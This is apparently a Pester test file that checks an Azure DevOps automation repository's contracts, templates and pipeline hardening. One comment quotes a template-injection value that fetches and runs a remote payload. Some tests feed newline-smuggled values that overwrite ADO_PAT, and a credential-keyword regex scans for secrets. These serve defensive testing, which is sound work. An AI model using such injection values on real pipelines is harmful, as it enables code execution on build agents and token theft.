<#
    Contract tests for the automations.

    These do not exercise Azure DevOps. They verify the things that break quietly
    between releases: a shipped example that stopped matching its schema, an entry
    point that lost a command, a template that acquired a real value.
#>

BeforeAll {
    . (Join-Path $PSScriptRoot '..\TestHelpers.ps1')
    $repoRoot = Get-RepositoryRoot
    . (Join-Path $repoRoot 'foundation/Import-Foundation.ps1')

    # $script: so the value is visibly shared with the It blocks below.
    $script:automations = @(
        @{ Name = 'team-provisioning';               EntryPoint = 'Invoke-TeamProvisioning.ps1' }
        @{ Name = 'variable-group-configuration';    EntryPoint = 'Invoke-VariableGroupConfiguration.ps1' }
        @{ Name = 'service-connection-provisioning'; EntryPoint = 'Invoke-ServiceConnectionProvisioning.ps1' }
    )
}

Describe 'Automation contract' {

    It 'every automation has an entry point, a guide, a config folder and a schema folder' {
        # The contract in docs/reference/automation-contract.md, enforced rather than
        # only described - which is the difference between a contract and a wish.
        foreach ($automation in $script:automations) {
            $folder = Join-Path (Get-RepositoryRoot) "automations/$($automation.Name)"

            Test-Path -LiteralPath (Join-Path $folder $automation.EntryPoint) | Should -BeTrue -Because "$($automation.Name) needs a single entry point"
            Test-Path -LiteralPath (Join-Path $folder 'README.md') | Should -BeTrue -Because "$($automation.Name) needs a guide"
            Test-Path -LiteralPath (Join-Path $folder 'config') | Should -BeTrue -Because "$($automation.Name) needs a config folder"
            Test-Path -LiteralPath (Join-Path $folder 'schemas') | Should -BeTrue -Because "$($automation.Name) needs a schema folder"
        }
    }

    It 'every entry point exposes validate, plan and apply, and gates apply behind a confirmation' {
        foreach ($automation in $script:automations) {
            $path = Join-Path (Get-RepositoryRoot) "automations/$($automation.Name)/$($automation.EntryPoint)"
            $content = Get-Content -Raw -LiteralPath $path

            $content | Should -BeLike "*'validate'*" -Because "$($automation.Name) must offer an offline check"
            $content | Should -BeLike "*'plan'*" -Because "$($automation.Name) must offer a dry run"
            $content | Should -BeLike "*'apply'*" -Because "$($automation.Name) must offer an apply"
            $content | Should -BeLike '*ConfirmApply*' -Because "$($automation.Name) must not write without an explicit confirmation"
            $content | Should -BeLike '*Assert-PlanApplicable*' -Because "$($automation.Name) must refuse a blocked plan"
        }
    }

    It 'every automation README documents rollback' {
        # The one section people skip, and the one that matters at 2am.
        foreach ($automation in $script:automations) {
            $readme = Get-Content -Raw -LiteralPath (Join-Path (Get-RepositoryRoot) "automations/$($automation.Name)/README.md")
            $readme | Should -BeLike '*Rollback*' -Because "$($automation.Name) must say how to reverse what it did"
        }
    }

    It 'every automation is registered in the project context' {
        $context = Get-AdoAsCodeConfiguration -Path (Join-Path (Get-RepositoryRoot) 'foundation/config/project-context.json')
        foreach ($automation in $script:automations) {
            @($context.automations.PSObject.Properties.Name) | Should -Contain $automation.Name
        }
    }
}

Describe 'Shipped examples' {

    It 'the team-provisioning application template satisfies its schema' {
        $root = Get-RepositoryRoot
        { Get-AdoAsCodeConfiguration -Path (Join-Path $root 'automations/team-provisioning/config/applications.example.json') } |
            Should -Not -Throw
    }

    It 'the board column template satisfies its schema and the reconciler rules' {
        $root = Get-RepositoryRoot
        $template = Get-AdoAsCodeConfiguration -Path (Join-Path $root 'automations/team-provisioning/config/board-columns.json')
        { Test-AdoBoardColumnTemplate -Template $template } | Should -Not -Throw
    }

    It 'the variable group scope template satisfies its schema' {
        $root = Get-RepositoryRoot
        { Get-AdoAsCodeConfiguration -Path (Join-Path $root 'automations/variable-group-configuration/config/scope.example.json') } |
            Should -Not -Throw
    }

    It 'the service connection template satisfies its schema' {
        $root = Get-RepositoryRoot
        { Get-AdoAsCodeConfiguration -Path (Join-Path $root 'automations/service-connection-provisioning/config/service-connections.example.json') } |
            Should -Not -Throw
    }

    It 'no .env template carries a credential value' {
        # A template with a credential in it is how a real one reaches a public
        # repository: somebody fills it in "just to test" and commits the file whose
        # name does not look local. Non-secret defaults - an organization URL, a
        # project name - are allowed and useful; anything credential-shaped is not.
        $root = Get-RepositoryRoot
        $templates = @(Get-ChildItem -LiteralPath $root -Recurse -File -Filter '*.env*' |
            Where-Object { $_.Name -like '*.example' })
        $templates.Count | Should -BeGreaterThan 0

        $credentialKey = '(?i)(pat|password|passwd|secret|token|api[_-]?key|private[_-]?key|credential)'

        foreach ($template in $templates) {
            foreach ($line in (Get-Content -LiteralPath $template.FullName)) {
                if ($line -notmatch '^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=(.*)$') { continue }
                $name = $Matches[1]
                $value = $Matches[2].Trim()
                if (-not $value) { continue }

                $name | Should -Not -Match $credentialKey -Because "$($template.Name) line '$name' must be left empty"
            }
        }
    }

    It 'the values CSV template declares no secret' {
        $root = Get-RepositoryRoot
        $scope = Get-AdoAsCodeConfiguration -Path (Join-Path $root 'automations/variable-group-configuration/config/scope.example.json')
        $secretKeys = @($scope.declaredKeys | Where-Object { [bool]$_.isSecret } | ForEach-Object { "$($_.name)" })
        $secretKeys.Count | Should -BeGreaterThan 0

        $csv = @(Import-Csv -LiteralPath (Join-Path $root 'automations/variable-group-configuration/config/variable-groups.example.csv'))
        foreach ($row in $csv) {
            $secretKeys | Should -Not -Contain $row.variable
        }
    }

    It 'the forbidden key is absent from the environments that forbid it' {
        $root = Get-RepositoryRoot
        $scope = Get-AdoAsCodeConfiguration -Path (Join-Path $root 'automations/variable-group-configuration/config/scope.example.json')
        $csv = @(Import-Csv -LiteralPath (Join-Path $root 'automations/variable-group-configuration/config/variable-groups.example.csv'))

        foreach ($environmentProperty in $scope.forbiddenKeysByEnvironment.PSObject.Properties) {
            foreach ($forbidden in @($environmentProperty.Value)) {
                $offending = @($csv | Where-Object { $_.environment -eq $environmentProperty.Name -and $_.variable -eq $forbidden })
                $offending.Count | Should -Be 0 -Because "$forbidden is forbidden in $($environmentProperty.Name)"
            }
        }
    }
}

Describe 'Offline validate' {

    It 'every automation validates with no credentials in the environment' {
        # Proves the claim the guides make. If validate needed a token, a newcomer
        # could not check their configuration before asking for one.
        foreach ($variable in @('ADO_PAT', 'ADO_ORG_URL', 'ADO_PROJECT')) {
            [Environment]::SetEnvironmentVariable($variable, $null, 'Process')
        }

        foreach ($automation in $script:automations) {
            $path = Join-Path (Get-RepositoryRoot) "automations/$($automation.Name)/$($automation.EntryPoint)"
            { & $path -Command validate -InformationAction SilentlyContinue } |
                Should -Not -Throw -Because "$($automation.Name) validate must work offline"
        }
    }
}

Describe 'Blast radius of a writing verb' {

    It 'every automation refuses apply without -ApplicationKey' {
        # docs/reference/command-model.md states that -ApplicationKey is "Required by
        # every writing verb", and the blast-radius argument in
        # docs/overview/scope-and-limits.md ("One application per apply") rests on it.
        # Two of the three did not enforce it: -ApplicationKey was a plain filter, so
        # 'apply -ConfirmApply' with no key wrote to every application in scope times
        # every environment - six Variable Groups in the shipped example, PROD
        # included, behind one confirmation.
        #
        # This asserts behaviour by invoking the entry point, rather than grepping the
        # file for a substring the way the contract test above does. The refusal
        # happens before any credential is read, so the assertion needs no network and
        # no token.
        foreach ($variable in @('ADO_PAT', 'ADO_ORG_URL', 'ADO_PROJECT')) {
            [Environment]::SetEnvironmentVariable($variable, $null, 'Process')
        }

        foreach ($automation in $script:automations) {
            $path = Join-Path (Get-RepositoryRoot) "automations/$($automation.Name)/$($automation.EntryPoint)"

            { & $path -Command apply -ConfirmApply -InformationAction SilentlyContinue } |
                Should -Throw -ExpectedMessage '*-ApplicationKey is required*' `
                    -Because "$($automation.Name) apply must be narrowed to one application"
        }
    }

    It 'the refusal names the applications that are actually declared' {
        # An error that says what to pass next costs one line and saves a round trip.
        foreach ($variable in @('ADO_PAT', 'ADO_ORG_URL', 'ADO_PROJECT')) {
            [Environment]::SetEnvironmentVariable($variable, $null, 'Process')
        }

        foreach ($automation in $script:automations) {
            $path = Join-Path (Get-RepositoryRoot) "automations/$($automation.Name)/$($automation.EntryPoint)"

            $message = ''
            try { & $path -Command apply -ConfirmApply -InformationAction SilentlyContinue }
            catch { $message = "$($_.Exception.Message)" }

            $message | Should -BeLike '*APP_ALPHA*' -Because "$($automation.Name) should name the declared keys"
        }
    }
}

Describe 'Pipeline definitions' {

    BeforeAll {
        $script:pipelineFiles = @(Get-ChildItem -LiteralPath (Join-Path (Get-RepositoryRoot) 'pipelines') -Filter '*.yml')
    }

    It 'ships a pipeline definition per automation' {
        @($script:pipelineFiles).Count | Should -Be 3
    }

    It 'never expands a template expression inside a script body' {
        # A template expression is evaluated at compile time, so interpolating a
        # free-text queue-time parameter into a script body pastes the value in as
        # SOURCE CODE. All three pipelines did that with applicationKey,
        # organizationUrl and project - none of which has a closed value list - in
        # jobs holding ADO_PAT and the SFTP credentials. A value of
        #     x'; iwr http://host/payload.ps1 | iex; '
        # closed the quoting and ran on the agent.
        #
        # The rule this asserts: a template expression may appear only where it
        # assigns an env: variable, which passes the value as data. Anything else is
        # a finding.
        $marker = '$' + '{{'

        foreach ($file in $script:pipelineFiles) {
            $offenders = @(
                Get-Content -LiteralPath $file.FullName |
                    Where-Object { $_.Contains($marker) } |
                    Where-Object { $_.Trim() -notmatch '^PARAM_[A-Z0-9_]+:' }
            )

            @($offenders).Count | Should -Be 0 `
                -Because "$($file.Name) must pass queue-time parameters through env:, not into a script body. Offending: $($offenders -join ' | ')"
        }
    }

    It 'actually passes its parameters through env, so the check above is not vacuous' {
        # Without this, deleting every parameter would make the test above pass.
        $marker = '$' + '{{'

        foreach ($file in $script:pipelineFiles) {
            $mapped = @(
                Get-Content -LiteralPath $file.FullName |
                    Where-Object { $_.Contains($marker) -and $_.Trim() -match '^PARAM_[A-Z0-9_]+:' }
            )

            @($mapped).Count | Should -BeGreaterThan 2 -Because "$($file.Name) should map its queue-time parameters to env"
        }
    }

    It 'reads every mapped parameter back out of the environment' {
        # A parameter mapped into env: and then never read is a parameter that
        # silently does nothing - which is how the hardening would rot.
        $marker = '$' + '{{'

        foreach ($file in $script:pipelineFiles) {
            $content = Get-Content -Raw -LiteralPath $file.FullName
            $names = @(
                Get-Content -LiteralPath $file.FullName |
                    ForEach-Object { if ($_.Trim() -match '^(PARAM_[A-Z0-9_]+):' -and $_.Contains($marker)) { $Matches[1] } }
            )

            foreach ($name in $names) {
                $content | Should -BeLike "*`$env:$name*" -Because "$($file.Name) maps $name but never reads it"
            }
        }
    }
}

Describe 'Pipeline environment file' {

    BeforeAll {
        $script:pipelineFiles = @(Get-ChildItem -LiteralPath (Join-Path (Get-RepositoryRoot) 'pipelines') -Filter '*.yml')
    }

    It 'removes the environment file whatever the run did' {
        # The file carries ADO_PAT in clear text. On a Microsoft-hosted agent the
        # workspace is discarded, which is the assumption the writing step was built
        # on - but a self-hosted agent is the case this repository exists for, and
        # there the workspace survives, so a missing cleanup step leaves the token on
        # disk between builds for every other pipeline on that agent to read.
        foreach ($file in $script:pipelineFiles) {
            $content = Get-Content -Raw -LiteralPath $file.FullName

            $content | Should -BeLike '*Remove-EnvironmentFile.ps1*' `
                -Because "$($file.Name) must remove the environment file it wrote"
            $content | Should -Match '(?s)Remove the environment file.*?condition:\s*always\(\)' `
                -Because "$($file.Name) must remove it unconditionally - a failed apply leaves the file exactly like a successful one"
        }
    }

    It 'removes the environment file before it publishes the evidence' {
        foreach ($file in $script:pipelineFiles) {
            $lines = @(Get-Content -LiteralPath $file.FullName)
            $removeAt = [array]::FindIndex($lines, [Predicate[string]] { $args[0] -match 'Remove the environment file' })
            $publishAt = [array]::FindIndex($lines, [Predicate[string]] { $args[0] -match '^\s*-\s*publish:' })

            $removeAt | Should -BeGreaterThan 0 -Because "$($file.Name) has no cleanup step"
            $publishAt | Should -BeGreaterThan 0 -Because "$($file.Name) has no publish step"
            $removeAt | Should -BeLessThan $publishAt `
                -Because "$($file.Name) must clean up before publishing, so a widened publish cannot pick the file up"
        }
    }

    It 'never passes a secret on a command line' {
        # A command line is visible to every other process on the agent, which is the
        # audience a secret variable exists to keep it from. Secrets are mapped into
        # the step's env: and read from there by name.
        foreach ($file in $script:pipelineFiles) {
            $content = Get-Content -Raw -LiteralPath $file.FullName
            $content | Should -Not -Match '-\w*(Token|Password|Pat|Secret)\s+\$env:' `
                -Because "$($file.Name) must not pass a credential as an argument"
        }
    }

    It 'names secrets the way the automation resolves them' {
        # A Variable Group secret is resolved from <NAME>_<ENVIRONMENT>. The pipeline
        # used to export APP_ALPHA_PASSWORD and APP_BETA_PASSWORD, which match neither
        # that scheme nor .env.example - so no secret ever resolved from a pipeline run
        # and every group holding one was reported blocked. It failed safe and it was
        # entirely inoperative.
        $content = Get-Content -Raw -LiteralPath (
            Join-Path (Get-RepositoryRoot) 'pipelines/variable-group-configuration.yml')

        foreach ($environment in @('DEV', 'QA', 'PROD')) {
            $content | Should -BeLike "*APP_SERVER_PASSWORD_$environment*" `
                -Because 'the qualified name is the one Get-AdoVariableGroupSecretSource looks for'
        }
        $content | Should -Not -Match 'APP_(ALPHA|BETA)_PASSWORD'
    }

    It 'carries every credential variable the shipped connections declare' {
        # A private key variable was declared in .env.example and exported by no
        # pipeline, so a connection needing one could only ever be created with the
        # sentinel.
        $configuration = Get-Content -Raw -LiteralPath (
            Join-Path (Get-RepositoryRoot) 'automations/service-connection-provisioning/config/service-connections.example.json') |
            ConvertFrom-Json
        $content = Get-Content -Raw -LiteralPath (
            Join-Path (Get-RepositoryRoot) 'pipelines/service-connection-provisioning.yml')

        foreach ($application in $configuration.applications) {
            foreach ($environment in $application.environments) {
                foreach ($property in $configuration.credentialVariables.PSObject.Properties) {
                    $name = "$($property.Value)".Replace('{application}', "$($application.key)").Replace('{environment}', "$environment")
                    $content | Should -BeLike "*$name*" `
                        -Because "the pipeline must carry $name, which the configuration declares"
                }
            }
        }
    }
}

Describe 'Assert-ParameterValue' {

    BeforeAll {
        . (Join-Path (Get-RepositoryRoot) 'scripts/pipeline/PipelineParameters.ps1')
    }

    It 'rejects a value carrying a line break' {
        # Even passed as data rather than as source, a value with a newline appends
        # arbitrary KEY=VALUE lines to the environment file - enough to override
        # ADO_PAT with a token of the caller's choosing.
        { Assert-ParameterValue -Name 'project' -Value "Platform`nADO_PAT=stolen" } |
            Should -Throw -ExpectedMessage '*line break*'
    }

    It 'rejects a carriage return as well as a newline' {
        { Assert-ParameterValue -Name 'project' -Value "Platform`rADO_PAT=stolen" } |
            Should -Throw -ExpectedMessage '*line break*'
    }

    It 'rejects a value that does not match its expected form' {
        { Assert-ParameterValue -Name 'organizationUrl' -Value 'not-a-url' -Pattern '^https://' } |
            Should -Throw -ExpectedMessage '*does not match the expected form*'
    }

    It 'throws on an empty value only when it is required' {
        { Assert-ParameterValue -Name 'applicationKey' -Value '' -Required } |
            Should -Throw -ExpectedMessage '*required and arrived empty*'
        Assert-ParameterValue -Name 'applicationKey' -Value '' | Should -Be ''
    }

    It 'returns the trimmed value' {
        Assert-ParameterValue -Name 'project' -Value '  Platform  ' | Should -Be 'Platform'
    }

    It 'accepts the shapes the pipelines actually pass' {
        Assert-ParameterValue -Name 'organizationUrl' -Value 'https://dev.azure.com/contoso' -Required `
            -Pattern '^https://[A-Za-z0-9][A-Za-z0-9.-]*/[A-Za-z0-9._~%-]+$' |
            Should -Be 'https://dev.azure.com/contoso'
    }
}
